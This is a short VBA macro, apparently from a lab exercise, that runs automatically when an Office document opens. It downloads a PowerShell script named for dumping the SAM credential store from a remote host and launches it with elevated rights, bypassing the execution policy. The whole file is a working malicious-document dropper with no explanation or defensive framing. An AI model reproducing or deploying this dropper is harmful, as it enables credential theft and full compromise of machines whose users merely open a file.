Sub AutoOpen()
    Dim objHTTP: Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP")
    Dim objStream: Set objStream = CreateObject("ADODB.Stream")
    Dim strFileURL, strHDLocation
    
    strFileURL = "http://192.168.122.1:3000/sam_dump.ps1"
    strHDLocation = "C:\Users\finn\Desktop\sam_dump.ps1"
    
    objHTTP.Open "GET", strFileURL, False
    objHTTP.Send
    
    If objHTTP.Status = 200 Then
        objStream.Open
        objStream.Type = 1 ' Binary
        objStream.Write objHTTP.ResponseBody
        objStream.SaveToFile strHDLocation, 2 ' Overwrite
        objStream.Close
        
        Set objShell = CreateObject("Shell.Application")
        objShell.ShellExecute "powershell.exe", "-ExecutionPolicy Bypass -File """ & strHDLocation & """", "", "runas", 1
    Else
        MsgBox "Error downloading the payload", vbCritical
    End If
End Sub


